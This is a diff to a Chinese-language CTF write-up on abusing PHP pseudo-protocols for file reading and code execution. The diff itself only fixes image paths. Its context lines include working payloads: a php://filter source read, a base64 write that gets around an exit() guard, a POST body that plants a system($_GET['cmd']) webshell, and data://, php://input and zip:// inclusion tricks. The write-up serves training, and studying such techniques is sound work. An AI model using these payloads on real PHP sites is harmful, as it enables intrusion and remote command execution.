@@ -64,9 +64,9 @@ payload：
 ?file=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
-![filter_read](.\php伪协议image\filter_read.png)
+![filter_read](./php伪协议image/filter_read.png)
 
-![filter_base64](.\php伪协议image\filter_base64.png)
+![filter_base64](./php伪协议image/filter_base64.png)
 
 ### 文件写入场景—file_put_content和死亡·杂糅
 
@@ -89,15 +89,15 @@ https://www.leavesongs.com/PENETRATION/php-filter-magic.html
 ?>
 ```
 
-![filter_write_1](.\php伪协议image\filter_write_1.png)
+![filter_write_1](./php伪协议image/filter_write_1.png)
 
 写入后的文件如下：
 
-![filter_write_code](.\php伪协议image\filter_write_code.png)
+![filter_write_code](./php伪协议image/filter_write_code.png)
 
 访问后并不会执行`phpinfo();`因为exit();退出了
 
-![filter_write_2](.\php伪协议image\filter_write_2.png)
+![filter_write_2](./php伪协议image/filter_write_2.png)
 
 可以使用php://filter的过滤器对原本的代码进行转换使其解析不了
 
@@ -108,11 +108,11 @@ PD9waHAgcGhwaW5mbygpOw== --> <?php phpinfo();
 前面填充的aaa是为了让<?php exit('66');?>aaaPD9waHAgcGhwaW5mbygpOw==满足4的倍数才能使base64正确解码
 ```
 
-![filter_write_3](.\php伪协议image\filter_write_3.md)
+![filter_write_3](./php伪协议image/filter_write_3.md)
 
 访问后成功执行php
 
-![filter_write_4](.\php伪协议image\filter_write_4.png)
+![filter_write_4](./php伪协议image/filter_write_4.png)
 
 当然除了base64以外其他的编码也可以用常用杂糅方式
 
@@ -233,7 +233,7 @@ Connection: close
 content=aaPD9waHAgaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pO3N5c3RlbSgkX0dFVFsnY21kJ10pOw%3D%3D
 ```
 
-![web87flag](.\image_include\web87_flag.png)
+![web87flag](./image_include/web87_flag.png)
 
 ctfshow{7c5fc6fb-824a-4ab1-a2eb-01264953da6e}
 
@@ -255,11 +255,11 @@ ctfshow{7c5fc6fb-824a-4ab1-a2eb-01264953da6e}
 
 传入`?a=<?php system(dir);?>`是不会执行命令的并且报错不能打开流，在1.php中放入`<?php system(dir);?>`并传入`?a=1.php`是可以被执行的，原因是include只能包含文件或者流。
 
-![input_1](.\php伪协议image\input_1.png)
+![input_1](./php伪协议image/input_1.png)
 
 另外在不能上传文件的情况下，也可以使用php://input把post中的参数作为输入流传入实现命令执行，注意传入的不是`<?php system(dir);?>`而是输入流，输入流有`<?php system(dir);?>`
 
-![input_2](.\php伪协议image\input_2.png)
+![input_2](./php伪协议image/input_2.png)
 
 所以只要能识别流的函数都可以使用php://input作为输入，常见函数（满足上面php://filter的函数都适用）：
 
@@ -315,7 +315,7 @@ ctfshow{7c5fc6fb-824a-4ab1-a2eb-01264953da6e}
 
 显然思路就是知道某个文件中的内容，然后使$ac等于该文件中的内容，$fn读取该文件，但是显然不知道文件内容就没办法绕过`if ($ac === $f)`，上面在常用函数中说了file_get_contents()也可以读取文件流，所以使用php://input绕过即可
 
-![input_3](.\php伪协议image\input_3.png)
+![input_3](./php伪协议image/input_3.png)
 
 ## data://伪协议搭配文件包含实现命令执行
 
@@ -421,13 +421,13 @@ http://10.10.10.1/ctf/input.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO
 </html>
 ```
 
-![zip_upload](F:\桌面\CTFShow\php伪协议image\zip_upload.png)
+![zip_upload](./php伪协议image/zip_upload.png)
 
 
 
 可以构造zip压缩包利用zip://伪协议包含zip文件中的webshell
 
-![zip_1](.\php伪协议image\zip_1.png)
+![zip_1](./php伪协议image/zip_1.png)
 
 payload：
 
@@ -437,7 +437,7 @@ payload：
 
 
 
-![zip_shell](.\php伪协议image\zip_shell.png)
+![zip_shell](./php伪协议image/zip_shell.png)
 
 ## zlib://协议
 
@@ -452,7 +452,7 @@ payload：
 
 该协议除了打开gz压缩文件以外，还可以用来读取文件
 
-![zlib](F:\桌面\CTFShow\php伪协议image\zlib.png)
+![zlib](./php伪协议image/zlib.png)
 
 ## bzip2://伪协议
 
